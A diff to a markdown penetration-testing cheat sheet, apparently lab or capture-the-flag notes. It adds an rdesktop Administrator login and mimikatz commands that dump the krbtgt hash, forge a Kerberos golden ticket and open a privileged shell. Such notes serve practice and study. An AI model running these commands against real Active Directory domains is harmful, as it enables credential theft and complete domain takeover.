@@ -367,6 +367,7 @@ smbclient \\\\$IP\\nt4wrksv
 
 ```
 rdesktop -u <username> -p <password> $IP -g 70% -r disk:folder=/home/toor/cd/apps
+rdesktop -u Administrator -d CONTROLLER $IP
 ```
 
 </details>
@@ -456,6 +457,9 @@ mimikatz
 ```
 privilege::debug #ensure that the output is "Privilege '20' ok"
 lsadump::lsa /patch #dump hashes
+lsadump::lsa /inject /name:krbtgt # dumps hash and security id of kerb ticket
+kerberos::golden /user: /domain: /sid: /krbtgt: /id: #create a golden ticket!
+misc::cmd #open cmd with elevated priveleges to all machines
 ```
 
 - [powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
